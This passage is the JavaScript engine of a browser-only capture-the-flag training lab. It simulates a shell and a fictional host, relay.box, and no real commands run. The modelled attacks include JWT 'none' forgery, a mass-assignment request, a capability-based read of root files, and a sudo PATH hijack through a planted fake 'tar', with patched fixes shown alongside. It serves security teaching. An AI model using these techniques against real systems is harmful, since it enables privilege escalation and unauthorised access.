      if(cmd==='help')return output('LOCAL SIMULATION — commands never run on your computer\n\nDiscovery: nmap -sV 10.10.10.42\nWeb:       curl http://relay.box/robots.txt\nRequest:   request POST /api/profile {"displayName":"Alice","plan":"staff"}\nHeaders:   use the target browser Request tab for modelled headers\nDecode:    decode <base64 text>\nJWT:       jwt-none {"sub":"alice","role":"admin"}\nFoothold:  ssh dev@relay.box\nExplore:   pwd, whoami, ls -la, cd <path>, cat <path>\nInspect:   sudo -l, getcap -r /\nRead:      relay-read <path>\nWrite:     write <path> <text>\nPermit:    chmod +x <path>\nRun:       sudo /usr/local/bin/relay-backup --ticket <release ticket>\nOther:     clear, history, reset-shell, reset-model\n\nUse the target browser to inspect Source, Storage, and Request.');
      if(cmd==='reset-model'){this.model=freshModel();return output('Exercise state reset: collector, profile, archive, coupons and cache. Captured flags preserved.');}
      if(cmd==='jwt-none'){try{return output(jwtNone(JSON.parse(text.slice(cmd.length).trim())));}catch{return output('Use jwt-none followed by a JSON claims object.');}}
      if(cmd==='request'){
        const match=text.match(/^request\s+(GET|POST)\s+(\/\S*)\s*(.*)$/i);if(!match)return output('Use request GET|POST /path JSON-body.');
        try{const body=match[3]?JSON.parse(match[3]):{};const r=target(match[2],this.session,this.patched,this.model,{method:match[1],body});return output(`HTTP ${r.status}\n${typeof r.body==='string'?r.body:JSON.stringify(r.body,null,2)}`);}catch{return output('Invalid JSON request body.');}
      }
      if(cmd==='nmap')return /(?:10\.10\.10\.42|relay\.box)/.test(text)?output('SIMULATED SERVICE MAP — no scan performed\nHost: relay.box (10.10.10.42)\n22/tcp  open  ssh   Relay SSH model\n80/tcp  open  http  Relay staff services\n\nHTTP entry: /\nInspect ordinary pages before forming a hypothesis.'):output('Only relay.box / 10.10.10.42 exists in this simulation.');
      if(cmd==='curl'){
        const address=args.find(a=>a.startsWith('http://')||a.startsWith('https://')||a.startsWith('/'))||'';
        let path=address;if(address.startsWith('http')){let url;try{url=new URL(address);}catch{return output('Invalid simulated address.');}if(!['relay.box','10.10.10.42'].includes(url.hostname))return output('No external target is supported. Use relay.box.');path=url.pathname+url.search;}
        const r=target(path,this.session,this.patched,this.model);return output(`HTTP ${r.status}\n${typeof r.body==='string'?r.body:JSON.stringify(r.body,null,2)}`);
      }
      if(cmd==='decode'){try{const b=args.join('');if(!/^[A-Za-z0-9+/]*={0,2}$/.test(b)||b.length%4!==0||!b)throw new Error();return output(decode(b));}catch{return output('Invalid Base64. Use decode followed by the full backup text.');}}
      if(cmd==='ssh'){if(!['dev@relay.box','dev@10.10.10.42'].includes(args[0]))return output('Only the seeded dev account on relay.box is supported.');this.passwordPrompt=true;return {output:'Fictional lab password:',prompt:true};}
      if(cmd==='reset-shell'){this.user='guest';this.cwd='/home/dev';this.files={...FILES};this.executable.clear();return output('Simulated shell reset. Captured flags are preserved.');}
      if(cmd==='whoami')return output(this.user);
      if(this.user!=='dev')return output('The guest session has no filesystem access. Discover the exposed configuration, then use the simulated SSH account.');
      if(cmd==='getcap')return output(this.patched?'No special capabilities on the reader.':'/usr/local/bin/relay-read cap_dac_read_search=ep');
      if(cmd==='relay-read')return args[0]==='/root/capability.txt'?output(this.patched?'Permission denied. Capability removed.':FLAGS.capability):output('Only /root/capability.txt is part of this capability-read exercise.');
      if(cmd==='pwd')return output(this.cwd);
      if(cmd==='ls'){
        const path=normalize(args.find(a=>!a.startsWith('-'))||'.',this.cwd);if(path.startsWith('/root'))return output('Permission denied.');
        const entries=new Set(Object.keys(this.files).filter(p=>p.startsWith(path==='/'?'/':path+'/')).map(p=>p.slice(path==='/'?1:path.length+1).split('/')[0]));
        if(path==='/home/dev')entries.add('bin');return output(entries.size?[...entries].sort().join('\n'):'Directory empty or not present in the model.');
      }
      if(cmd==='cd'){const path=normalize(args[0]||'/home/dev',this.cwd);if(path.startsWith('/root'))return output('Permission denied.');if(['/','/home','/home/dev','/home/dev/bin','/srv','/srv/relay','/etc','/usr/local/bin'].includes(path)){this.cwd=path;return output('');}return output('Directory not present in the model.');}
      if(cmd==='cat'){
        const path=normalize(args[0]||'',this.cwd);if(path.startsWith('/root'))return output('Permission denied.');
        if(this.patched&&path==='/usr/local/bin/relay-backup')return output('#!/bin/sh\nexport PATH=/usr/bin:/bin\ncd /srv/relay\n/usr/bin/tar -czf /var/backups/relay.tar.gz .\n');
        return output(Object.hasOwn(this.files,path)?this.files[path]:'File not present in the model.');
      }
      if(cmd==='sudo'&&args[0]==='-l')return output('User dev may run the following command on relay:\n    (root) NOPASSWD: /usr/local/bin/relay-backup --ticket <release ticket>\n\nRelease-ticket proof must arrive via the cache exercise. This is a permission model, not real sudo.');
      if(cmd==='write'){
        const path=normalize(args[0]||'',this.cwd);if(!path.startsWith('/home/dev/bin/'))return output('Only /home/dev/bin/<name> is writable in this exercise.');
        this.files[path]=args.slice(1).join(' ');return output(`Wrote simulated file ${path}. It is not executable yet.`);
      }
      if(cmd==='chmod'&&args[0]==='+x'){
        const path=normalize(args[1]||'',this.cwd);if(!path.startsWith('/home/dev/bin/')||!Object.hasOwn(this.files,path))return output('No writable helper exists at that path.');
        this.executable.add(path);return output(`Marked simulated file ${path} executable.`);
      }
      if(cmd==='sudo'&&args[0]==='/usr/local/bin/relay-backup'){
        if(this.patched)return output('Patched helper: PATH=/usr/bin:/bin; /usr/bin/tar invoked.\nBackup completed. User-writable command lookup prevented.');
        if(!this.model.releaseTicket||args[1]!=='--ticket'||args[2]!=='relay-release-26')return output('Release ticket not verified. Recover the ticket through the cache-victim exercise, then supply --ticket <ticket>.');
        const helper='/home/dev/bin/tar';
        if(this.executable.has(helper)&&/cat\s+\/root\/root\.txt/.test(this.files[helper]||''))return output('Vulnerable helper resolved tar from /home/dev/bin.\nSimulated root-context output:\n'+FLAGS.root+'\n');
        return output('Backup completed using tar. Inspect the helper’s PATH and command lookup.');
      }
      return output(`Command not supported by this teaching model: ${cmd}. Type help.`);
    }
  }
  const exported={Box,CHALLENGES,target,normalize,escapeHTML,freshModel,jwtNone};
  if(typeof module!=='undefined'&&module.exports)module.exports=exported;else root.RelayEngine=exported;
})(typeof window!=='undefined'?window:globalThis);
